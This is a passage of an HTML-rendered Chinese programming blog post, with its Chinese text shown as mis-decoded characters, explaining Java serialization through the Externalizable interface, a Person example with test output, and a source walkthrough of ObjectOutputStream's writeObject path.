class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Externalizable</span> <span class="keyword">extends</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">  <span class="comment">//å°†è¦åºåˆ—åŒ–çš„å¯¹è±¡å±æ€§é€šè¿‡ var1.wrietXxx() å†™å…¥åˆ°åºåˆ—åŒ–æµä¸­</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput var1)</span> <span class="keyword">throws</span> IOException;</span><br><span class="line"><span class="comment">//å°†è¦ååºåˆ—åŒ–çš„å¯¹è±¡å±æ€§é€šè¿‡ var1.readXxx() è¯»å‡ºæ¥</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Externalizable çš„ä½¿ç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Externalizable</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">7424420983806112577L</span>;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    å®ç°äº†Externalizableè¿™ä¸ªæ¥å£éœ€è¦æä¾›æ— å‚æ„é€ ï¼Œåœ¨ååºåˆ—åŒ–æ—¶ä¼šæ£€æµ‹</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Person: empty&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;person writeExternal...&quot;</span>);</span><br><span class="line">        out.writeObject(name);</span><br><span class="line">        out.writeInt(age);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;person readExternal...&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        name = (String) in.readObject();</span><br><span class="line">        age = in.readInt();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æµ‹è¯• Person å¯¹è±¡çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExternalizableMain</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FILE_PATH</span> <span class="operator">=</span> <span class="string">&quot;../person.bin&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;zhangsan&quot;</span>, <span class="number">15</span>);</span><br><span class="line">        System.out.println(person.toString());</span><br><span class="line">        serializable(person, FILE_PATH);</span><br><span class="line">        System.out.println(<span class="string">&quot;============ååºåˆ—åŒ–=============&quot;</span>);</span><br><span class="line">        person = (Person) deserializable(FILE_PATH);</span><br><span class="line">        System.out.println(person.toString());</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializable</span><span class="params">(Object o, String path)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">boas</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(path);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(boas);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line">        boas.close();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">deserializable</span><span class="params">(String path)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(path));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> bis.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•è¾“å‡ºç»“æœï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Person&#123;name=<span class="string">&#x27;zhangsan&#x27;</span>, age=<span class="number">15</span>&#125;</span><br><span class="line">person writeExternal...</span><br><span class="line">============ååºåˆ—åŒ–=============</span><br><span class="line">Person: empty</span><br><span class="line">person readExternal...</span><br><span class="line">Person&#123;name=<span class="string">&#x27;zhangsan&#x27;</span>, age=<span class="number">15</span>&#125;</span><br></pre></td></tr></table></figure><h1 id="Java-çš„åºåˆ—åŒ–æ­¥éª¤ä¸æ•°æ®ç»“æ„åˆ†æ"><a href="#Java-çš„åºåˆ—åŒ–æ­¥éª¤ä¸æ•°æ®ç»“æ„åˆ†æ" class="headerlink" title="Java çš„åºåˆ—åŒ–æ­¥éª¤ä¸æ•°æ®ç»“æ„åˆ†æ"></a>Java çš„åºåˆ—åŒ–æ­¥éª¤ä¸æ•°æ®ç»“æ„åˆ†æ</h1><p>åºåˆ—åŒ–ç®—æ³•ä¸€èˆ¬ä¼šæŒ‰æ­¥éª¤åšå¦‚ä¸‹äº‹æƒ…ï¼š</p><ul><li>å°†å¯¹è±¡å®ä¾‹ç›¸å…³çš„ç±»å…ƒæ•°æ®è¾“å‡º</li><li>é€’å½’åœ°è¾“å‡ºç±»çš„è¶…ç±»æè¿°ç›´åˆ°ä¸å†æœ‰è¶…ç±»</li><li>ç±»å…ƒæ•°æ®å®Œäº†ä»¥åï¼Œå¼€å§‹ä»æœ€é¡¶å±‚çš„è¶…ç±»å¼€å§‹è¾“å‡ºå¯¹è±¡å®ä¾‹çš„å®é™…æ•°æ®å€¼</li><li>ä»ä¸Šè‡³ä¸‹é€’å½’è¾“å‡ºå®ä¾‹çš„æ•°æ®</li></ul><h2 id="writeObject-åŸç†åˆ†æ"><a href="#writeObject-åŸç†åˆ†æ" class="headerlink" title="writeObject åŸç†åˆ†æ"></a>writeObject åŸç†åˆ†æ</h2><p><code>ObjectOutputStream</code> æ„é€ å‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ObjectOutputStream</span><span class="params">(OutputStream out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    verifySubclass();</span><br><span class="line">    bout = <span class="keyword">new</span> <span class="title class_">BlockDataOutputStream</span>(out);<span class="comment">//â‘ </span></span><br><span class="line">    handles = <span class="keyword">new</span> <span class="title class_">HandleTable</span>(<span class="number">10</span>, (<span class="type">float</span>) <span class="number">3.00</span>);</span><br><span class="line">    subs = <span class="keyword">new</span> <span class="title class_">ReplaceTable</span>(<span class="number">10</span>, (<span class="type">float</span>) <span class="number">3.00</span>);</span><br><span class="line">    enableOverride = <span class="literal">false</span>;<span class="comment">//â‘¡</span></span><br><span class="line">    writeStreamHeader();<span class="comment">//â‘¢</span></span><br><span class="line">    bout.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">        debugInfoStack = <span class="keyword">new</span> <span class="title class_">DebugTraceInfoStack</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        debugInfoStack = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>boutï¼šç”¨äºå†™å…¥ä¸€äº›ç±»å…ƒæ•°æ®è¿˜æœ‰å¯¹è±¡ä¸­åŸºæœ¬æ•°æ®ç±»å‹çš„å€¼</li><li>enableOverride ï¼šfalse è¡¨ç¤ºä¸æ”¯æŒé‡å†™åºåˆ—åŒ–è¿‡ç¨‹ï¼Œå¦‚æœä¸º true ï¼Œé‚£ä¹ˆéœ€è¦é‡å†™ writeObjectOverride æ–¹æ³•ã€‚è¿™ä¸ªä¸€èˆ¬ä¸ç”¨ç®¡å®ƒ</li><li>writeStreamHeader() å†™å…¥å¤´ä¿¡æ¯</li></ul><p><strong>ObjectOutputStream#writeStreamHeader()</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">writeStreamHeader</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    bout.writeShort(STREAM_MAGIC);<span class="comment">//â‘ </span></span><br><span class="line">    bout.writeShort(STREAM_VERSION);<span class="comment">//â‘¡</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>STREAM_MAGIC å£°æ˜ä½¿ç”¨äº†åºåˆ—åŒ–åè®®ï¼Œbout å°±æ˜¯ä¸€ä¸ªæµï¼Œå°†å¯¹åº”çš„å¤´æ•°æ®å†™å…¥è¯¥æµä¸­</p></li><li><p>STREAM_VERSION æŒ‡å®šåºåˆ—åŒ–åè®®ç‰ˆæœ¬</p></li></ul><p><strong>ObjectOUtStream#writeObject(obj);</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (enableOverride) &#123;<span class="comment">//ä¸€èˆ¬ä¸ä¼šèµ°è¿™é‡Œï¼Œå› ä¸ºåœ¨ ObjectOutputStream æ„é€ è®¾ç½®ä¸º false äº†</span></span><br><span class="line">        writeObjectOverride(obj);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;<span class="comment">//ä»£ç ä¼šæ‰§è¡Œè¿™é‡Œ</span></span><br><span class="line">        writeObject0(obj, <span class="literal">false</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ObjectOutStream#writeObject0()</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject0</span><span class="params">(Object obj, <span class="type">boolean</span> unshared)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">     </span><br><span class="line">        <span class="type">Object</span> <span class="variable">orig</span> <span class="operator">=</span> obj;</span><br><span class="line">        Class&lt;?&gt; cl = obj.getClass();</span><br><span class="line">        ObjectStreamClass desc;</span><br><span class="line">       </span><br><span class="line">        <span class="comment">//â‘ </span></span><br><span class="line">        desc = ObjectStreamClass.lookup(cl, <span class="literal">true</span>);</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">//â‘¡</span></span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">            writeClass((Class) obj, unshared);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ObjectStreamClass) &#123;</span><br><span class="line">            writeClassDesc((ObjectStreamClass) obj, unshared);</span><br><span class="line">        <span class="comment">// END Android-changed:  Make Class and ObjectStreamClass replaceable.</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            writeString((String) obj, unshared);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cl.isArray()) &#123;</span><br><span class="line">            writeArray(obj, desc, unshared);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Enum) &#123;</span><br><span class="line">            writeEnum((Enum&lt;?&gt;) obj, desc, unshared);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Serializable) &#123;</span><br><span class="line">            writeOrdinaryObject(obj, desc, unshared);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//â‘¢</span></span><br><span class="line">            <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotSerializableException</span>(</span><br><span class="line">                    cl.getName() + <span class="string">&quot;\n&quot;</span> + debugInfoStack.toString());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotSerializableException</span>(cl.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â‘  lookup å‡½æ•°ç”¨äºæŸ¥æ‰¾å½“å‰ç±»çš„ ObjectStreamClass ï¼Œå®ƒæ˜¯ç”¨äºæè¿°ä¸€ä¸ªç±»çš„ç»“æ„ä¿¡æ¯çš„ï¼Œé€šè¿‡å®ƒå°±å¯ä»¥è·å–å¯¹è±¡åŠå…¶å¯¹è±¡å±æ€§çš„ç›¸å…³ä¿¡æ¯ï¼Œå¹¶ä¸”å®ƒå†…éƒ¨æŒæœ‰è¯¥å¯¹è±¡çš„çˆ¶ç±»çš„ ObjectStreamClass å®ä¾‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">ObjectStreamClass</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; cl)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.cl = cl;</span><br><span class="line">    name = cl.getName();</span><br><span class="line">    isProxy = Proxy.isProxyClass(cl);</span><br><span class="line">    isEnum = Enum.class.isAssignableFrom(cl);</span><br><span class="line">    serializable = Serializable.class.isAssignableFrom(cl);</span><br><span class="line">    externalizable = Externalizable.class.isAssignableFrom(cl);</span><br><span class="line">    Class&lt;?&gt; superCl = cl.getSuperclass();</span><br><span class="line">  <span class="comment">//superDesc è¡¨ç¤ºéœ€è¦åºåˆ—åŒ–å¯¹è±¡çš„çˆ¶ç±»çš„ ObjectStreamClassï¼Œå¦‚æœä¸ºç©ºï¼Œåˆ™è°ƒç”¨ lookUp æŸ¥æ‰¾</span></span><br><span class="line">    superDesc = (superCl != <span class="literal">null</span>) ? lookup(superCl, <span class="literal">false</span>) : <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//localDesc è¡¨ç¤ºè‡ªå·±</span></span><br><span class="line">    localDesc = <span class="built_in">this</span>;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â‘¡ æ ¹æ® obj çš„ç±»å‹å»æ‰§è¡Œåºåˆ—åŒ–æ“ä½œï¼Œå¦‚æœä¸ç¬¦åˆåºåˆ—åŒ–è¦æ±‚ï¼Œé‚£ä¹ˆä¼šâ‘¢ä½ç½®æŠ›å‡º <code>NotSerializableException</code> å¼‚å¸¸</p><blockquote><p>åœ¨ä¸Šé¢æè¿°è¿‡ï¼Œå¦‚æœä¸€ä¸ªéœ€è¦åºåˆ—åŒ–çš„å¯¹è±¡çš„æŸä¸ªå±æ€§æ²¡æœ‰å®ç°åºåˆ—åŒ–æ¥å£ï¼Œé‚£ä¹ˆå°±ä¼šæ­¤å¤„æŠ›å‡ºå¼‚å¸¸</p></blockquote><p><strong>ObjectOutputStream#writeOrdinaryObject</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeOrdinaryObject</span><span class="params">(Object obj,</span></span><br><span class="line"><span class="params">                                 ObjectStreamClass desc,</span></span><br><span class="line"><span class="params">                                 <span class="type">boolean</span> unshared)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        desc.checkSerialize();</span><br><span class="line">        <span class="comment">//â‘ </span></span><br><span class="line">        bout.writeByte(TC_OBJECT);</span><br><span class="line">        <span class="comment">//â‘¡</span></span><br><span class="line">        writeClassDesc(desc, <span class="literal">false</span>);</span><br><span class="line">        handles.assign(unshared ? <span class="literal">null</span> : obj);</span><br><span class="line">        <span class="comment">//â‘¢</span></span><br><span class="line">        <span class="keyword">if</span> (desc.isExternalizable() &amp;&amp; !desc.isProxy()) &#123;</span><br><span class="line">            writeExternalData((Externalizable) obj);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//â‘£</span></span><br><span class="line">            writeSerialData(obj, desc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">            debugInfoStack.pop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â‘  å†™å…¥ç±»çš„å…ƒæ•°æ®ï¼ŒTC_OBJECT. å£°æ˜è¿™æ˜¯ä¸€ä¸ªæ–°çš„å¯¹è±¡ï¼Œå¦‚æœå†™å…¥çš„æ˜¯ä¸€ä¸ª String ç±»å‹çš„æ•°æ®ï¼Œé‚£ä¹ˆå°±éœ€è¦ TC_STRING è¿™ä¸ªæ ‡è¯†</p><p>â‘¡ <code>writeClassDesc</code> æ–¹æ³•ä¸»è¦ä½œç”¨å°±æ˜¯è‡ªä¸Šè€Œä¸‹(ä»çˆ¶ç±»å†™åˆ°å­ç±»ï¼Œæ³¨æ„åªä¼šéå†é‚£äº›å®ç°äº†åºåˆ—åŒ–æ¥å£çš„ç±»)å†™å…¥æè¿°ä¿¡æ¯</p><p>â‘¢ <code>desc.isExternalizable()</code> åˆ¤æ–­éœ€è¦åºåˆ—åŒ–çš„å¯¹è±¡æ˜¯å¦å®ç°äº† Externalizable æ¥å£</p><p>â‘£ <code>writeSerialData</code> åœ¨æ²¡æœ‰å®ç° <code>Externalizable</code> æ¥å£æ—¶ï¼Œå°±æ‰§è¡Œè¿™ä¸ªæ–¹æ³•</p><p><strong>ObjectOutputstream#writeSerialData</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeSerialData</span><span class="params">(Object obj, ObjectStreamClass desc)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//â‘  </span></span><br><span class="line">    ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; slots.length; i++) &#123;</span><br><span class="line">    </span><br><span class="line">        <span class="type">ObjectStreamClass</span> <span class="variable">slotDesc</span> <span class="operator">=</span> slots[i].desc;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (slotDesc.hasWriteObjectMethod()) &#123;<span class="comment">//â‘¡</span></span><br><span class="line">            <span class="type">PutFieldImpl</span> <span class="variable">oldPut</span> <span class="operator">=</span> curPut;</span><br><span class="line">            curPut = <span class="literal">null</span>;</span><br><span class="line">            <span class="type">SerialCallbackContext</span> <span class="variable">oldContext</span> <span class="operator">=</span> curContext;</span><br><span class="line">            <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                debugInfoStack.push(</span><br><span class="line">                    <span class="string">&quot;custom writeObject data (class \&quot;&quot;</span> +</span><br><span class="line">                    slotDesc.getName() + <span class="string">&quot;\&quot;)&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                curContext = <span class="keyword">new</span> <span class="title class_">SerialCallbackContext</span>(obj, slotDesc);</span><br><span class="line">                bout.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">                slotDesc.invokeWriteObject(obj, <span class="built_in">this</span>);</span><br><span class="line">                bout.setBlockDataMode(<span class="literal">false</span>);</span><br><span class="line">                bout.writeByte(TC_ENDBLOCKDATA);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                curContext.setUsed();</span><br><span class="line">                curContext = oldContext;</span><br><span class="line">                <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                    debugInfoStack.pop();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            curPut = oldPut;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            defaultWriteFields(obj, slotDesc);<span class="comment">//â‘¢</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â‘  desc.getClassDataLayout ä¼šè¿”å› ObjectStreamClass.ClassDataSlot[] ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹ ClassDataSlot ç±»ï¼Œå¯ä»¥çœ‹åˆ°å®ƒæ˜¯å°è£…äº† ObjectStreamClass è€Œå·²ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ç®€å•çš„è®¤ä¸º â‘  è¿™ä¸€æ­¥å°±æ˜¯ç”¨äºè¿”å›åºåˆ—åŒ–å¯¹è±¡åŠå…¶çˆ¶ç±»çš„ ClassDataSlot[] æ•°ç»„ï¼Œæˆ‘ä»¬å¯ä»¥ä» ClassDataSlot ä¸­è·å–å¯¹åº” ObjectStreamClass æè¿°ä¿¡æ¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ClassDataSlot</span> &#123;</span><br><span class="line">    <span class="comment">/** class descriptor &quot;occupying&quot; this slot */</span></span><br><span class="line">    <span class="keyword">final</span> ObjectStreamClass desc;</span><br><span class="line">    <span class="comment">/** true if serialized form includes data for this slot&#x27;s 